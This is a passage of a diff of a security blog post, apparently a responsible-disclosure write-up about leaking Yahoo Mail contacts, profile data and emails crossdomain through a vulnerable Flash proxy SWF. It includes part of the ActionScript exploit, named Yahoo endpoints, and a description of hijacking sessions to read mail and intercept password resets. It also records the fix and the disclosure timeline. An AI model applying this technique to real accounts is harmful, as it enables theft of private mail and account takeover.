+</span><span class='line'>                            <span class="k">if</span><span class="o">(</span><span class="n">stolenXML</span><span class="o">.</span><span class="na">name</span><span class="o">()</span> <span class="o">||</span> <span class="n">stolenXML</span><span class="o">.</span><span class="na">hasComplexContent</span><span class="o">())</span>
+</span><span class='line'>                                <span class="n">ret</span> <span class="o">=</span> <span class="n">stolenXML</span><span class="o">.</span><span class="na">toXMLString</span><span class="o">();</span>
 </span><span class='line'>                            <span class="k">else</span>
-</span><span class='line'>                                <span class="nx">ret</span> <span class="o">=</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+</span><span class='line'>                                <span class="n">ret</span> <span class="o">=</span> <span class="n">stolenXML</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
 </span><span class='line'>
-</span><span class='line'>                            <span class="k">if</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span>
+</span><span class='line'>                            <span class="k">if</span><span class="o">(</span><span class="n">callback</span><span class="o">)</span>
 </span><span class='line'>                                <span class="c1">// Flash can&#39;t be trusted to serialize `ret` properly. Just encode it.</span>
-</span><span class='line'>                                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">callback</span><span class="o">,</span> <span class="nx">encodeURIComponent</span><span class="p">(</span><span class="nx">ret</span><span class="p">));</span>
-</span><span class='line'>                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                                <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">callback</span><span class="o">,</span> <span class="n">encodeURIComponent</span><span class="o">(</span><span class="n">ret</span><span class="o">));</span>
+</span><span class='line'>                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
 </span><span class='line'>                            <span class="c1">// Hit a timeout when trying to fetch the response. Either a non-200 status code</span>
 </span><span class='line'>                            <span class="c1">// was returned, or we couldn&#39;t parse the body as XML :(</span>
-</span><span class='line'>                            <span class="k">if</span><span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">&gt;</span> <span class="nx">timeLimit</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>                                <span class="k">if</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span>
-</span><span class='line'>                                    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">callback</span><span class="o">,</span> <span class="kc">null</span><span class="p">);</span>
-</span><span class='line'>                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span class='line'>                                <span class="nx">checkFinished</span><span class="p">();</span>
-</span><span class='line'>                            <span class="p">}</span>
-</span><span class='line'>                        <span class="p">}</span>
-</span><span class='line'>                    <span class="p">}</span><span class="o">,</span> <span class="mi">10</span><span class="p">);</span>
-</span><span class='line'>                <span class="p">}</span>
-</span><span class='line'>                <span class="nx">checkFinished</span><span class="p">();</span>
-</span><span class='line'>            <span class="p">}</span><span class="o">,</span> <span class="mi">100</span><span class="p">);</span>
-</span><span class='line'>        <span class="p">};</span>
+</span><span class='line'>                            <span class="k">if</span><span class="o">(</span><span class="k">new</span> <span class="kt">Date</span><span class="o">().</span><span class="n">getTime</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">timeLimit</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>                                <span class="k">if</span><span class="o">(</span><span class="n">callback</span><span class="o">)</span>
+</span><span class='line'>                                    <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">callback</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span><span class='line'>                            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span><span class='line'>                                <span class="n">checkFinished</span><span class="o">();</span>
+</span><span class='line'>                            <span class="o">}</span>
+</span><span class='line'>                        <span class="o">}</span>
+</span><span class='line'>                    <span class="o">},</span> <span class="mi">10</span><span class="o">);</span>
+</span><span class='line'>                <span class="o">}</span>
+</span><span class='line'>                <span class="n">checkFinished</span><span class="o">();</span>
+</span><span class='line'>            <span class="o">},</span> <span class="mi">100</span><span class="o">);</span>
+</span><span class='line'>        <span class="o">};</span>
 </span><span class='line'>
 </span><span class='line'>        <span class="c1">// Load up the vulnerable proxy SWF</span>
-</span><span class='line'>        <span class="k">var</span> <span class="nx">MCLoader</span><span class="o">:</span><span class="nb">Loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Loader</span><span class="p">();</span>
-</span><span class='line'>        <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">load</span><span class="p">(</span><span class="k">new</span> <span class="nb">URLRequest</span><span class="p">(</span><span class="nx">PROXY_URL</span><span class="p">));</span>
-</span><span class='line'>        <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">contentLoaderInfo</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">COMPLETE</span><span class="o">,</span> <span class="nx">ldrComplete</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
+</span><span class='line'>        <span class="kd">var</span> <span class="n">MCLoader</span><span class="p">:</span><span class="kt">Loader</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">Loader</span><span class="o">();</span>
+</span><span class='line'>        <span class="n">MCLoader</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="k">new</span> <span class="kt">URLRequest</span><span class="o">(</span><span class="n">PROXY_URL</span><span class="o">));</span>
+</span><span class='line'>        <span class="n">MCLoader</span><span class="o">.</span><span class="na">contentLoaderInfo</span><span class="o">.</span><span class="na">addEventListener</span><span class="o">(</span><span class="n">Event</span><span class="o">.</span><span class="na">COMPLETE</span><span class="o">,</span> <span class="n">ldrComplete</span><span class="o">);</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
 </span></code></pre></td></tr></table></div></figure>
+
+
 
 
 <p>Now here&rsquo;s the tricky part. We need to find interesting, leakable endpoints. We can&rsquo;t leak them if they return invalid XML (ruling out most webpages and JSON containing HTML fragments,) we can&rsquo;t leak them if they return a non-200 status code, and we can&rsquo;t leak them if they require an auth token we can&rsquo;t guess.</p>
 
+
+
+
 <p><a href="https://ca-mg6.mail.yahoo.com/neo/ws/sd?/v1/user/me/contacts;count=max;sort=asc?format=json&amp;view=compact&amp;_sc=1">Some</a> alternative <a href="https://ca-mg6.mail.yahoo.com/neo/ws/sd?/v1/user/me/profile;count=max;sort=asc?format=json&amp;_sc=1">endpoints</a> for the <a href="https://developer.yahoo.com/social/">Social API</a> fit the bill nicely. They let us fetch the current user&rsquo;s contacts and profile without requiring an auth token or user ID. You can see those leaking to a page we control here:</p>
+
+
+
 
 <p><a href="/images/posts/ymail_again/justsocialstuff.png"><img class="center" src="/images/posts/ymail_again/thumbs/justsocialstuff.png" width="640" height="480"></a></p>
 
+
+
+
 <h2>But What About Mail?</h2>
+
+
+
 
 <p>One that stumped me for a long time was getting the user&rsquo;s mail. All of the endpoints for mail listings required a valid WSSID (web services session id?) Unfortunately, all the endpoints I could find that would give me one had non-200 response codes or wouldn&rsquo;t parse as XML. I eventually found what I was looking for by running YMail&rsquo;s android app through mitmproxy. <a href="https://m.mg.mail.yahoo.com/hg/controller/controller.php">Here you can see the WSSID we wanted</a>, returned with a 200 response code. Even though this endpoint&rsquo;s normally requested with a <code>POST</code> method, a <code>GET</code> with no params still gives us the WSSID&hellip; Sweet!</p>
 
+
+
+
 <p><a href="/images/posts/ymail_again/ymail-mitm.png"><img class="center" src="/images/posts/ymail_again/thumbs/ymail-mitm.jpg" width="640" height="480"></a></p>
+
+
+
 
 <p>Let&rsquo;s leak the user&rsquo;s mail now. We&rsquo;ve got <a href="https://ca-mg6.mail.yahoo.com/mailsearch/v2/search?appid=YahooMailNeo&amp;wssid=PUT_WSSID_HERE&amp;sorting=-date&amp;query=%7B%22keyword%22%3A%22http%22%2C%22group%22%3A%7B%22from%22%3A%7B%7D%2C%22folder%22%3A%7B%7D%2C%22flags%22%3A%7B%22order%22%3A%22desc%22%7D%2C%22attachmenttype%22%3A%7B%7D%2C%22date%22%3A%7B%22unit%22%3A%22year%22%7D%7D%2C%22flags%22%3A%7B%22softdelete%22%3A0%7D%7D">a mail search endpoint here</a> that will return mail fragments without embedded HTML. You can see you&rsquo;ll still sometimes get angle brackets in the response due to inline replies, but you can muck with the query to get around those.</p>
 
+
+
+
 <p><a href="/images/posts/ymail_again/search-endpoint.png"><img class="center" src="/images/posts/ymail_again/thumbs/search-endpoint.png" width="640" height="480"></a></p>
+
+
+
 
 <p>Now, that WSSID functions as a CSRF token as well, so we can now do anything we want as the current user. We can send mail as them, delete all their emails, basically anything a normal user can do.</p>
 
+
+
+
 <p>Here&rsquo;s a small page demonstrating a bunch of things we can do as long as the user is on a page we control. As you can see, We&rsquo;ve got the full list of contacts, all of the user&rsquo;s personal details including their email address and name, and a listing of their emails.</p>
+
+
+
 
 <p><a href="/images/posts/ymail_again/show-all.png"><img class="center" src="/images/posts/ymail_again/thumbs/show-all.png" width="640" height="480"></a></p>
 
+
+
+
 <p>We&rsquo;ve got enough for a fully-weaponized exploit at this point. We can not only leak their emails, we can also achieve lateral movement by triggering password resets on other services they use, and pulling the reset URLs right out of their email, then deleting them. Of course, previously emailed username/password combos are fair game, too. Very handy for the APT folks ;)</p>
+
+
+
 
 <h2>The Fix</h2>
 
+
+
+
 <p><code>hotspotgallery.swf</code>&rsquo;s allowDomain call has since been changed to <code>Security.allowDomain("sp.yimg.com")</code>, but that doesn&rsquo;t fix the core issue. There are thousands and thousands of forgotten .swfs on disused subdomains, many of which are probably vulnerable to similar exploits. As long as those <code>crossdomain.xml</code> rules are as loose as they are, it&rsquo;s only a matter of time before someone finds one and exploits YMail&hellip; again.</p>
+
+
+
 
 <p>.swfs that actually need crossorigin access to YMail should be moved to the existing <code>mail.yimg.com</code> subdomain, and the <code>crossdomain.xml</code> should be tightened up to keep YMail safe from rogue galleries of Asian imports and pet shows.</p>
 
+
+
+
 <h2>About Yahoo!&rsquo;s Initial Response</h2>
+
+
+
 
 <p>The other thing I want to mention is the initial response I got. I initially submitted an overview of the issue and attached a proof-of-concept that put the JSON from the contacts endpoint in a textbox. Very rudimentary, but sufficient to show crossorigin data leakage. All I got in response was a form reply basically saying &ldquo;This is intended behaviour, wontfix&rdquo;. I replied asking why they thought that, and if they had any issues reproducing the issue, but didn&rsquo;t receive a reply.</p>
 
+
+
+
 <p>I know that reproing Flash issues can be a pain in the ass, and I realized the PoC would break if served from localhost, so I hosted a version with no setup required that more clearly showed what was leaked. I posted a link to the new PoC, reiterating what was being leaked. Still no response. It wasn&rsquo;t until I posted the version that leaked mail contents 8 months later that I got an unscripted reply.</p>
+
+
+
 
 <p>I get that Yahoo! probably receives tons of spurious reports every day, but without something actionable like &ldquo;I don&rsquo;t think X is a bug because Y&rdquo; or &ldquo;I&rsquo;m unable to reproduce the issue, Z happens instead&rdquo;, reporters don&rsquo;t have anything to go on if they&rsquo;re reporting a genuine issue. Without any feedback on what the issue is with the report, their only way to potentially get the bug fixed is through public disclosure (which an operator of a bug bounty probably doesn&rsquo;t want.) I also know this isn&rsquo;t an isolated case, since I recently saw a presentation where an RCE on Yahoo!&rsquo;s reverse proxies got the same treatment.</p>
 
+
+
+
 <p>To Yahoo&rsquo;s credit, the fellow who responded to my updated proof-of-concept was decently communicative, but every response I&rsquo;d ever received from Yahoo up &lsquo;til that point had been a scripted response of &ldquo;fixed&rdquo;, &ldquo;wontfix&rdquo;, &ldquo;confirmed&rdquo;, or &ldquo;new&rdquo;. When I work with a company (either as a consultant or just through one-off reports,) nothing impresses me more than engineers responding with additional details relevant to my reports, and nothing turns me off more than the company being difficult to communicate with, money or no.</p>
 
+
+
+
 <h2>Tips For Yahoo! Bug Bounty Participants</h2>
+
+
+
 
 <ul>
 <li>Until the <code>crossdomain.xml</code>s are fixed, .swfs and endpoints where the whole response body is controlled are extra-juicy targets</li>
@@ -485,7 +606,12 @@
 </ul>
 
 
+
+
 <h2>Disclosure Timeline</h2>
+
+
+
 
 <ul>
 <li>2014-02-09: Reported issue to vendor with PoC showing contacts leakage</li>
@@ -501,7 +627,12 @@
 </ul>
 
 
+
+
 <h2>Related Links</h2>
+
+
+
 
 <ul>
 <li><a href="https://hackerone.com/reports/1171">HackerOne report (private at time of posting)</a></li>
@@ -532,7 +663,8 @@
   
 
 
-<time datetime="2014-12-09T03:56:01-08:00" pubdate data-updated="true"><time class='entry-date' datetime='2014-12-09T03:56:01-08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:56 am</span></time></time>
+
+<time datetime="2014-12-09T03:56:01-08:00" pubdate data-updated="true"><time class='entry-date' datetime='2014-12-09T03:56:01-08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span></time></time>
       
 
 <span class="categories">
@@ -562,7 +694,7 @@
         <a class="basic-alignment left" href="/blog/2014/04/12/spooky-sanitizer-stories-analyzing-the-reddit-enhancement-suite-xss-flaw/" title="Previous Post: Spooky Sanitization Stories: Analyzing the XSS Flaw in Reddit Enhancement Suite">&laquo; Spooky Sanitization Stories: Analyzing the XSS Flaw in Reddit Enhancement Suite</a>
       
       
-        <a class="basic-alignment right" href="/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents/" title="Next Post: Leaking clipboard contents with Flash: Let's explore User-Initiated Actions!">Leaking clipboard contents with Flash: Let&#8217;s explore User-Initiated Actions! &raquo;</a>
+        <a class="basic-alignment right" href="/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents/" title="Next Post: Leaking Clipboard Contents With Flash: Let's Explore User-Initiated Actions!">Leaking Clipboard Contents With Flash: Let&#8217;s Explore User-Initiated Actions! &raquo;</a>
       
     </p>
   </footer>
@@ -576,7 +708,7 @@
   <h1>About Me</h1>
   <h3>Jordan Milne</h3>
   <p>I&#8217;m a programmer with a passion for web / browser security. Most of my spare time goes towards putting something together or trying to make it come apart.</p>
-  <p>I dream about timing attacks, info leaks, and same-origin policy violations.</p>
+  <p>I dream about timing attacks, info leaks, and same-origin policy bypasses.</p>
   <br/>
   &bull;<a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#100;&#x65;&#x66;&#x69;&#110;&#101;&#x64;&#109;&#x69;&#x73;&#x62;&#x65;&#x68;&#97;&#x76;&#105;&#x6f;&#x75;&#x72;&#x40;&#115;&#97;&#121;&#110;&#111;&#x74;&#111;&#108;&#105;&#110;&#117;&#120;&#x2e;&#x63;&#x6f;&#x6d;">Email</a><br/>
   &bull;<a href="http://www.linkedin.com/in/jordanamilne">LinkedIn</a><br/>
@@ -585,6 +717,10 @@
 <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/">JetBrains IDE Remote Code Execution and Local File Disclosure</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents/">Leaking Clipboard Contents With Flash: Let&#8217;s Explore User-Initiated Actions!</a>
@@ -600,10 +736,6 @@
     
       <li class="post">
         <a href="/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/">Yahoo&#8217;s Pet Show of Horrors: Leaking a User&#8217;s Emails Crossdomain</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2014/02/05/whats-that-smell-sniffing-cross-origin-frames-in-firefox/">What&#8217;s That Smell? Sniffing Cross-origin Frame Content in Firefox Using Timing Attacks</a>
       </li>
     
   </ul>
@@ -623,7 +755,7 @@
   <i>Any opinions expressed on this site are my own, and may not represent the opinions of those who, incidentally, give me money.</i>
 </p>
 <p>
-  Copyright &copy; 2015 - Jordan Milne -
+  Copyright &copy; 2016 - Jordan Milne -
   <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
 </p>
 
